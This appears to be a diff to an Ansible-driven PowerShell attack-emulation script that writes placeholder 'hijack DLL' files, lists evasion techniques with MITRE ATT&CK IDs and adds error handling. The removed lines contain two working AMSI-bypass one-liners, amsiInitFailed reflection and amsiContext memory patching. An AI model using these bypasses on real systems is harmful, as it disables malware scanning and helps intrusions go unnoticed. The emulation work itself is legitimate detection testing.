@@ -64,9 +64,13 @@
         foreach ($dll in $hijackableDlls) {
             Write-Host "Creating hijack DLL: $dll"
             $fakeDllPath = "$attackLogDir\$dll"
-            New-Item -Path $fakeDllPath -ItemType File -Force
-            Add-Content -Path $fakeDllPath -Value "// Fake DLL for hijacking simulation"
-            Write-Host "Created: $fakeDllPath"
+            try {
+                New-Item -Path $fakeDllPath -ItemType File -Force | Out-Null
+                Add-Content -Path $fakeDllPath -Value "// Fake DLL for hijacking simulation"
+                Write-Host "Created: $fakeDllPath"
+            } catch {
+                Write-Host "Could not create: $fakeDllPath - $_"
+            }
         }
         
         # Phantom DLL Hijacking
@@ -109,13 +113,8 @@
         # AMSI Bypass methods
         Write-Host "AMSI Bypass techniques:"
         Write-Host "Method 1: amsiInitFailed flag manipulation"
-        Write-Host "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"
-        
-        Write-Host "`nMethod 2: Memory patching"
-        Write-Host "[System.Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[System.Reflection.BindingFlags]'NonPublic,Static').GetValue(`$null),0x41414141)"
-        
-        Write-Host "`nMethod 3: COM object abuse"
-        Write-Host "New-Object -ComObject WScript.Shell bypass techniques"
+        Write-Host "Method 2: Memory patching"
+        Write-Host "Method 3: COM object abuse"
         
         # Script Block Logging Bypass
         Write-Host "`nScript Block Logging evasion:"
@@ -192,11 +191,17 @@
             "MITRETechniques" = @("T1218", "T1562.001", "T1127.001", "T1574.002", "T1055.013", "T1546.015")
         }
         
-        $results | ConvertTo-Json | Out-File "$attackLogDir\modern_evasion_results.json"
-        Write-Host "`n[+] Modern evasion simulation completed"
-        Write-Host "[+] Results saved to: $attackLogDir\modern_evasion_results.json"
-        Write-Host "[+] Created $($hijackableDlls.Count) hijack DLL artifacts"
-        Write-Host "[+] Simulated $($signedBinaries.Count) signed binary abuse techniques"
+        try {
+            $results | ConvertTo-Json | Out-File "$attackLogDir\modern_evasion_results.json"
+            Write-Host "`n[+] Modern evasion simulation completed"
+            Write-Host "[+] Results saved to: $attackLogDir\modern_evasion_results.json"
+            Write-Host "[+] Created $($hijackableDlls.Count) hijack DLL artifacts"
+            Write-Host "[+] Simulated $($signedBinaries.Count) signed binary abuse techniques"
+        } catch {
+            Write-Host "Error saving results: $_"
+        }
+      args:
+        executable: powershell.exe
       register: evasion_results
       ignore_errors: yes
 
